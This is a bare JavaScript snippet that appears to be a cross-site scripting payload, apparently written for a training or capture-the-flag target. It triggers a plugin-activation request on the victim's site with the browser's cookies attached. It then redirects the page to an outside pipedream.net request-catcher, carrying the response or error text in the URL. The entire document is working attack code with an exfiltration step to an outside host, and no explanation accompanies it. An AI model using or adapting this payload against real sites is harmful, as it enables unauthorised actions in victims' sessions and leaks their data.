var url = 'http://website-gafswq.inst.malicecyber.com/activate-plugin/1';
var xhr = new XMLHttpRequest();

xhr.open("GET", url, true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.setRequestHeader('Cookie', document.cookie);

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      var response = xhr.responseText;
      // Process the response as needed
      document.location="https://enpw216ps367.x.pipedream.net/?="+response
      console.log('Response:', response);
      // Handle the response data, e.g., parsing JSON, etc.
    } else {
      document.location="https://enpw216ps367.x.pipedream.net/?="+xhr.statusText
      console.error('Error:', xhr.statusText);
    }
  }
};

xhr.onerror = function() {
  console.error('Request failed');
};

// Sending the request
xhr.send();
